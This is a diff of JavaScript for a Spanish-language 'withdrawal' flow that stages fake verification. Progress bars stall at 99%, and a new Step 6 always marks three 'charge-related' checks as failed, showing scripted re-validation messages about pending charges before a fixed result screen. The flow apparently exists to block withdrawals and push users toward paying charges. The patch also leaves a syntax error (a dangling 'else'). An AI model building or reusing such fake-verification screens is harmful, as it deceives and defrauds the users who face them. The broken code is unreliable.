   item.className = 'vl-status-item';
   item.textContent = text;
   track.appendChild(item);
-
-  // Scroll up: translate by 60px per item added
   var count = track.children.length;
   track.style.transform = 'translateY(-' + ((count - 1) * 60) + 'px)';
-
-  // Fade in new item after a tick
   setTimeout(function(){ item.classList.add('vl-visible'); }, 30);
   vlMsgCurrentVisible = item;
 }
@@ -1573,13 +2088,9 @@ function startVerificationLoader() {
   vlCurrentPct = 0;
   vlStalled = false;
   vlMsgIndex = 0;
-
-  // Reset ring
   var arc = document.getElementById('vl-arc');
   arc.style.strokeDashoffset = vlCircumference;
   document.getElementById('vl-pct').textContent = '0';
-
-  // Show all parts
   document.getElementById('vl-checks').style.display = 'flex';
   document.getElementById('vl-stall-msg').classList.remove('show');
   document.getElementById('vl-result-screen').classList.remove('show');
@@ -1590,25 +2101,19 @@ function startVerificationLoader() {
   track.style.transform = 'translateY(0)';
   vlMsgCurrentVisible = null;
 
-  // First message immediately
   vlAddStatusMessage(VL_MESSAGES[vlMsgIndex % VL_MESSAGES.length]);
   vlMsgIndex++;
 
-  // Status messages change every ~3.2s
   vlStatusInterval = setInterval(function(){
     if(vlStalled) return;
     vlAddStatusMessage(VL_MESSAGES[vlMsgIndex % VL_MESSAGES.length]);
     vlMsgIndex++;
   }, 3200);
 
-  // Progress: 0 → 99 over 60 seconds
-  // Total ticks: 60000ms / 300ms = 200 ticks for 99 steps
-  // Actually use 100ms intervals and increment fractionally
   var TOTAL_MS = 60000;
   var TICK_MS = 150;
-  var incrementPerTick = 99 / (TOTAL_MS / TICK_MS); // ~0.2475 per tick
+  var incrementPerTick = 99 / (TOTAL_MS / TICK_MS);
 
-  // Check states milestone percentages
   setVLCheckState('vlc-1', 'wait');
   setVLCheckState('vlc-2', 'wait');
   setVLCheckState('vlc-3', 'wait');
@@ -1621,62 +2126,41 @@ function startVerificationLoader() {
 
   vlInterval = setInterval(function(){
     if(vlStalled) return;
-
     vlCurrentPct = Math.min(vlCurrentPct + incrementPerTick, 99);
     var displayPct = Math.floor(vlCurrentPct);
-
-    // Update ring
     var offset = vlCircumference * (1 - displayPct / 100);
     document.getElementById('vl-arc').style.strokeDashoffset = offset;
     document.getElementById('vl-pct').textContent = displayPct;
 
-    // Milestone check state updates
-    if(displayPct >= 15 && !firstCheckStarted) {
-      firstCheckStarted = true;
-      setVLCheckState('vlc-1', 'spin');
-    }
-    if(displayPct >= 40 && !firstCheckDone) {
-      firstCheckDone = true;
-      setVLCheckState('vlc-1', 'done');
-    }
-    if(displayPct >= 45 && !secondCheckStarted) {
-      secondCheckStarted = true;
-      setVLCheckState('vlc-2', 'spin');
-    }
-    if(displayPct >= 72 && !secondCheckDone) {
-      secondCheckDone = true;
-      setVLCheckState('vlc-2', 'done');
-    }
-    if(displayPct >= 78 && !thirdCheckStarted) {
-      thirdCheckStarted = true;
-      setVLCheckState('vlc-3', 'spin');
-    }
+    if(displayPct >= 15 && !firstCheckStarted) { firstCheckStarted = true; setVLCheckState('vlc-1', 'spin'); }
+    if(displayPct >= 40 && !firstCheckDone)    { firstCheckDone = true;    setVLCheckState('vlc-1', 'done'); }
+    if(displayPct >= 45 && !secondCheckStarted){ secondCheckStarted = true; setVLCheckState('vlc-2', 'spin'); }
+    if(displayPct >= 72 && !secondCheckDone)   { secondCheckDone = true;   setVLCheckState('vlc-2', 'done'); }
+    if(displayPct >= 78 && !thirdCheckStarted) { thirdCheckStarted = true; setVLCheckState('vlc-3', 'spin'); }
 
-    // Stall at 99
     if(vlCurrentPct >= 99) {
       vlCurrentPct = 99;
       vlStalled = true;
       clearInterval(vlInterval);
       clearInterval(vlStatusInterval);
+      if(vlMsgCurrentVisible) vlMsgCurrentVisible.classList.remove('vl-visible');
 
-      // Stop last status message fade
-      if(vlMsgCurrentVisible) {
-        vlMsgCurrentVisible.classList.remove('vl-visible');
-      }
-
-      // Show cancel icon / stall message
       setTimeout(function(){
         document.getElementById('vl-stall-msg').classList.add('show');
-        // Hide checks
         document.getElementById('vl-checks').style.display = 'none';
       }, 600);
 
-      // Transition to full result screen after 2.5s
+      // TRANSITION TO STEP 6 (instead of direct final result)
       setTimeout(function(){
         document.getElementById('vl-ring-wrap').style.display = 'none';
         document.getElementById('vl-status-wrap').style.display = 'none';
         document.getElementById('vl-stall-msg').classList.remove('show');
-        document.getElementById('vl-result-screen').classList.add('show');
+        // Switch to Step 6
+        document.getElementById('wfs-5').classList.remove('active');
+        document.getElementById('wfs-6').classList.add('active');
+        wfCurrentStep = 6;
+        document.getElementById('withdraw-flow').scrollTo(0,0);
+        startStep6();
       }, 2800);
     }
   }, TICK_MS);
@@ -1685,6 +2169,252 @@ function startVerificationLoader() {
 function stopVerificationLoader() {
   if(vlInterval){ clearInterval(vlInterval); vlInterval=null; }
   if(vlStatusInterval){ clearInterval(vlStatusInterval); vlStatusInterval=null; }
+}
+
+// ================================================================
+// STEP 6 — WITHDRAWAL VERIFICATION MODULE
+// ================================================================
+var s6Timers = [];
+var s6ProcInterval = null;
+
+function resetStep6() {
+  stopStep6();
+  // Reset banners
+  ['s6-b1','s6-b2','s6-b3','s6-guarantee','s6-procbar'].forEach(function(id){
+    var el = document.getElementById(id);
+    if(el) el.style.display = 'none';
+  });
+  // Reset checks
+  var cw = document.getElementById('s6-checks');
+  if(cw) cw.style.display = 'none';
+  for(var i=1;i<=7;i++){
+    var item = document.getElementById('s6c-'+i);
+    var num  = document.getElementById('s6n-'+i);
+    if(item){ item.classList.remove('visible','fail-row'); }
+    if(num) { num.className='s6-check-num'; num.innerHTML=i; }
+    var ft = document.getElementById('s6-fail-tag-'+i);
+    if(ft) ft.style.display='none';
+  }
+  // Reset proc bar
+  var fill = document.getElementById('s6-fill');
+  var pctEl = document.getElementById('s6-pct');
+  if(fill) fill.style.width='0';
+  if(pctEl) pctEl.textContent='0%';
+  // Reset loader text
+  var lt = document.querySelector('.s6-loader-title');
+  if(lt) lt.textContent='Iniciando análisis avanzado…';
+  var ls = document.querySelector('.s6-loader-sub');
+  if(ls) ls.textContent='Ejecutando verificación completa de retiro';
+  // Reset Next button
+  var btn = document.getElementById('s6-next-btn');
+  if(btn){
+    btn.disabled = true;
+    btn.classList.remove('processing');
+    btn.style.background = '';
+    btn.style.opacity = '';
+    btn.innerHTML = 'Continuar al Análisis Final <i class="fas fa-arrow-right" style="font-size:13px;"></i>';
+  }
+  // Hide revalidation bar
+  var rebar = document.getElementById('s6-reval-bar');
+  if(rebar) rebar.classList.remove('show');
+  var rf = document.getElementById('s6-reval-fill');
+  if(rf) rf.style.width = '0';
+  var rp = document.getElementById('s6-reval-pct');
+  if(rp) rp.textContent = '0%';
+  // Hide block message
+  var bm = document.getElementById('s6-block-msg');
+  if(bm) bm.classList.remove('show');
+  // Reset dot ring revalidating class
+  var ring = document.getElementById('s6-dot-ring');
+  if(ring) ring.classList.remove('revalidating');
+  // Reset next-clicked flag
+  s6NextClicked = false;
+}
+
+function stopStep6() {
+  s6Timers.forEach(function(t){clearTimeout(t);}); s6Timers=[];
+  if(s6ProcInterval){ clearInterval(s6ProcInterval); s6ProcInterval=null; }
+}
+
+// Items 3, 5, 6 are charge-related → FAIL
+var S6_FAIL_ITEMS = [3, 5, 6];
+
+function s6RevealCheck(n) {
+  var item = document.getElementById('s6c-'+n);
+  var num  = document.getElementById('s6n-'+n);
+  if(!item||!num) return;
+  item.classList.add('visible');
+  num.className = 's6-check-num spin';
+  num.innerHTML = '<i class="fas fa-circle-notch"></i>';
+}
+
+function s6CompleteCheck(n) {
+  var num  = document.getElementById('s6n-'+n);
+  var item = document.getElementById('s6c-'+n);
+  if(!num||!item) return;
+  var isFail = S6_FAIL_ITEMS.indexOf(n) !== -1;
+  if(isFail){
+    num.className = 's6-check-num fail';
+    num.innerHTML = '<i class="fas fa-xmark"></i>';
+    item.classList.add('fail-row');
+    var ft = document.getElementById('s6-fail-tag-'+n);
+    if(ft) ft.style.display='inline-flex';
+  } else {
+    num.className = 's6-check-num done';
+    num.innerHTML = '<i class="fas fa-check"></i>';
+  }
+}
+
+function s6Show(id) {
+  var el = document.getElementById(id);
+  if(el) el.style.display = 'block';
+}
+
+function s6ShowFlex(id) {
+  var el = document.getElementById(id);
+  if(el) el.style.display = 'flex';
+}
+
+function s6AnimateProcBar() {
+  var fill  = document.getElementById('s6-fill');
+  var pctEl = document.getElementById('s6-pct');
+  var pct   = 0;
+  s6ProcInterval = setInterval(function(){
+    pct = Math.min(pct + 1.1, 100);
+    var rounded = Math.round(pct);
+    if(fill)  fill.style.width  = rounded + '%';
+    if(pctEl) pctEl.textContent = rounded + '%';
+    if(pct >= 100){
+      clearInterval(s6ProcInterval);
+      s6ProcInterval = null;
+      // Enable the Next button — system is ready for final analysis
+      setTimeout(function(){
+        var btn = document.getElementById('s6-next-btn');
+        if(btn) {
+          btn.disabled = false;
+          btn.innerHTML = 'Continuar al Análisis Final <i class="fas fa-arrow-right" style="font-size:13px;"></i>';
+        }
+      }, 600);
+    }
+  }, 48);
+}
+
+// S6_FAIL_ITEMS check — items 3, 5, 6 fail → unresolved issues block progression
+var S6_HAS_UNRESOLVED = false; // items 3,5,6 always fail in this flow
+var s6NextClicked = false;
+
+function s6HandleNext() {
+  if(s6NextClicked) return;
+  s6NextClicked = true;
+
+  var btn = document.getElementById('s6-next-btn');
+  if(btn) {
+    btn.disabled = true;
+    btn.classList.add('processing');
+    btn.innerHTML = '<i class="fas fa-circle-notch fa-spin" style="font-size:13px;"></i> Procesando…';
+  }
+
+  // Trigger re-validation animation on dot ring
+  var ring = document.getElementById('s6-dot-ring');
+  if(ring) ring.classList.add('revalidating');
+
+  // Update loader text to show re-validation
+  var lt = document.querySelector('.s6-loader-title');
+  if(lt) lt.textContent = 'Re-validando análisis final…';
+  var ls = document.querySelector('.s6-loader-sub');
+  if(ls) ls.textContent = 'Ejecutando verificación de cumplimiento final';
+
+  // Show revalidation bar
+  var rebar = document.getElementById('s6-reval-bar');
+  if(rebar) rebar.classList.add('show');
+
+  // Animate revalidation bar 0→100 over ~5-6 seconds
+  var revalFill = document.getElementById('s6-reval-fill');
+  var revalPct  = document.getElementById('s6-reval-pct');
+  var revalText = document.getElementById('s6-reval-text');
+  var rPct = 0;
+  var revalMessages = [
+    'Re-validando análisis final…',
+    'Verificando cargos pendientes…',
+    'Comprobando estado de integración…',
+    'Confirmando requisitos de cumplimiento…',
+    'Finalizando evaluación del sistema…'
+  ];
+  var msgIdx = 0;
+  var msgInterval = setInterval(function(){
+    msgIdx = Math.min(msgIdx + 1, revalMessages.length - 1);
+    if(revalText) revalText.textContent = revalMessages[msgIdx];
+  }, 1000);
+
+  var revalInterval = setInterval(function(){
+    rPct = Math.min(rPct + 1.6, 100);
+    var r = Math.round(rPct);
+    if(revalFill) revalFill.style.width = r + '%';
+    if(revalPct)  revalPct.textContent  = r + '%';
+    if(rPct >= 100){
+      clearInterval(revalInterval);
+      clearInterval(msgInterval);
+      // After revalidation completes, check for unresolved issues
+      setTimeout(function(){
+        if(ring) ring.classList.remove('revalidating');
+        if(btn)  btn.classList.remove('processing');
+
+// ALWAYS GO TO FINAL STEP
+document.getElementById('wfs-6').classList.remove('active');
+document.getElementById('wfs-5').classList.add('active');
+wfCurrentStep = 5;
+
+document.getElementById('vl-result-screen').classList.add('show');
+document.getElementById('withdraw-flow').scrollTo(0,0); else {
+          // No unresolved issues — proceed to final step
+          document.getElementById('wfs-6').classList.remove('active');
+          document.getElementById('wfs-5').classList.add('active');
+          wfCurrentStep = 5;
+          document.getElementById('vl-result-screen').classList.add('show');
+          document.getElementById('withdraw-flow').scrollTo(0,0);
+        }
+      }, 400);
+    }
+  }, 55); // ~5.5s total
+}
+
+function startStep6() {
+  stopStep6();
+  resetStep6();
+
+  // Assign CSS custom prop for dot ring animation
+  var dots = document.querySelectorAll('#s6-dot-ring span');
+  dots.forEach(function(dot, i){
+    var deg = i * 30;
+    dot.style.transform = 'rotate('+deg+'deg) translateY(-38px) rotate(-'+deg+'deg)';
+    dot.style.setProperty('--dt', 'rotate('+deg+'deg) translateY(-38px) rotate(-'+deg+'deg)');
+  });
+
+  var tl = [
+    // Banners
+    { t: 900,  fn: function(){ s6Show('s6-b1'); } },
+    { t: 2300, fn: function(){ s6Show('s6-b2'); } },
+    { t: 3700, fn: function(){ s6Show('s6-b3'); } },
+    // Show checks wrapper
+    { t: 5000, fn: function(){ s6ShowFlex('s6-checks'); } },
+    // Check 1 — reveal
+    { t: 5400, fn: function(){ s6RevealCheck(1); } },
+    { t: 6400, fn: function(){ s6CompleteCheck(1); s6RevealCheck(2); } },
+    { t: 7500, fn: function(){ s6CompleteCheck(2); s6RevealCheck(3); } },
+    { t: 8700, fn: function(){ s6CompleteCheck(3); s6RevealCheck(4); } },
+    { t: 9900, fn: function(){ s6CompleteCheck(4); s6RevealCheck(5); } },
+    { t: 11100,fn: function(){ s6CompleteCheck(5); s6RevealCheck(6); } },
+    { t: 12300,fn: function(){ s6CompleteCheck(6); s6RevealCheck(7); } },
+    { t: 13500,fn: function(){ s6CompleteCheck(7); } },
+    // Guarantee + proc bar
+    { t: 14200,fn: function(){ s6Show('s6-guarantee'); s6Show('s6-procbar'); } },
+    { t: 15000,fn: function(){ s6AnimateProcBar(); } }
+  ];
+
+  tl.forEach(function(ev){
+    var id = setTimeout(ev.fn, ev.t);
+    s6Timers.push(id);
+  });
 }
 
 // Init pages
